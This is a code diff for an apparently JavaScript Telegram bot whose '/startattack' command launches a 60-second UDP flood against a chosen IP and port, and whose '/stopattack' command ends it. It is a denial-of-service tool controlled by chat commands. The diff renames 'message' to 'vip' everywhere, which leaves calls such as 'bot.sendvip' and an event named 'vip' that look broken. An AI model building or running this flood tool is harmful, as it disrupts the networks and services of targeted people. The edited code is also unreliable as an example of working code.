@@ -59,12 +59,12 @@ bot.command('bc', (ctx) => {
     }
 });
 
-bot.on('message', (msg) => {
+bot.on('vip', (msg) => {
     const chatId = msg.chat.id;
-    const messageText = msg.text ? msg.text.toLowerCase() : '';
+    const vipText = msg.text ? msg.text.toLowerCase() : '';
     const caption = msg.caption ? msg.caption.toLowerCase() : '';
 
-    if ((messageText === '/startattack' || caption.startsWith('/startattack')) && !attacking) {
+    if ((vipText === '/startattack' || caption.startsWith('/startattack')) && !attacking) {
         attacking = true;
 
         const targetIPMatch = caption.match(/\/startattack\s+([\d.]+)/);
@@ -73,7 +73,7 @@ bot.on('message', (msg) => {
         const duration = 60; // Attack duration in seconds
 
         const socket = dgram.createSocket('udp4');
-        const message = Buffer.from('A'); // UDP payload
+        const vip = Buffer.from('A'); // UDP payload
 
         let startTime = Date.now();
         const endTime = startTime + (duration * 1000);
@@ -82,7 +82,7 @@ bot.on('message', (msg) => {
 
         const sendPacket = () => {
             if (attacking) {
-                socket.send(message, targetPort, targetIP, (err) => {
+                socket.send(vip, targetPort, targetIP, (err) => {
                     if (err) {
                         console.error(err);
                     }
@@ -100,10 +100,10 @@ bot.on('message', (msg) => {
 
         sendPacket();
 
-        bot.sendMessage(chatId, `UDP flood attack started on ${targetIP}:${targetPort} for ${duration} seconds`);
-    } else if (messageText === '/stopattack' && attacking) {
+        bot.sendvip(chatId, `UDP flood attack started on ${targetIP}:${targetPort} for ${duration} seconds`);
+    } else if (vipText === '/stopattack' && attacking) {
         attacking = false;
-        bot.sendMessage(chatId, 'Attack stopped');
+        bot.sendvip(chatId, 'Attack stopped');
     }
 });
 
